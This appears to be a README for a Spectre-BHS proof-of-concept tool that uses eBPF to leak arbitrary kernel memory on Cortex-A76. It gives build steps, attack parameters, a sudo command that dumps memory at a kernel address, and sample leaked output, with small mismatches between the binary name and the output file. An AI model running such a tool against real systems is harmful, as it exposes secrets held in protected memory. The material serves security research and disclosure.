# Chimera: A Spectre-BHS Proof of Concept using eBPF

**Chimera** demonstrates exploitation of Branch History Speculation to leak arbitrary memory contents. This proof of concept has been validated on Cortex-A76 processors.

## Building

To build the program:
```bash
make CROSS_COMPILE=aarch64-linux-gnu- ARCH=aarch64
```
or 
```bash
make ARCH=amd64
```

The resulting executable `main.o` can be transferred to and executed on the target device.

## Command Line Parameters

| Parameter                   | Description                                                     | Example                 |
| --------------------------- | --------------------------------------------------------------- | ----------------------- |
| `-a, --addr ADDR_HEX`       | Start address (hex) from which to begin the memory leak         | `-a0xffffd0004c6bc008`  |
| `-l, --len=BYTES`           | Number of bytes to leak                                         | `-l0x10`                |
| `-p, --pass=N`              | Number of leak attempts (defaults to 1 if not provided)         | `-p4`                   |
| `-o, --output=FILE`         | Output file to store the leaked data (optional)                 | `-odump.txt`            |
| `-t, --threshold=THRESHOLD` | Threshold value for FLUSH+RELOAD (F+R) cache probe measurements | `-t100` (example value) |
| `-b, --nr_bh=N`             | Number of branch hints (affects branch history setup)           | `-b512`                 |
| `-s, --sz_bcond=N`          | Size of BHB-populating conditional branches, in instructions    | `-s2`                   |


## Example Usage

To dump 16 bytes (0x10) of memory starting at address 0xffffd0004c6bc008, with 4 validation passes, saving to dump.txt:

```bash
sudo ./chimera-ebpf -a0xffffd0004c6bc008 -l0x10 -p4 -odump.txt
```

### Sample Output
When leaking from an address containing known test data (loaded via a custom kernel module):

```
Page size: 16384
Start: ffffd0004c6bc008, Len: 16, Pass: 4
Pass 0:
ffffd0004c6bc008: 4c 6f 72 65 6d 20 69 70 73 75 6d 20 64 6f 6c 6f   Lorem ipsum dolo

Pass 1:
ffffd0004c6bc008: 4c 6f 72 65 6d 20 69 70 73 75 6d 20 64 6f 6c 6f   Lorem ipsum dolo

Pass 2:
ffffd0004c6bc008: 4c 6f 72 65 6d 20 69 70 73 75 6d 20 64 6f 6c 6f   Lorem ipsum dolo

Pass 3:
ffffd0004c6bc008: 4c 6f 72 65 6d 20 69 70 73 75 6d 20 64 6f 6c 6f   Lorem ipsum dolo

Written to /dev/null:
ffffd0004c6bc008: 4c 6f 72 65 6d 20 69 70 73 75 6d 20 64 6f 6c 6f   Lorem ipsum dolo
```
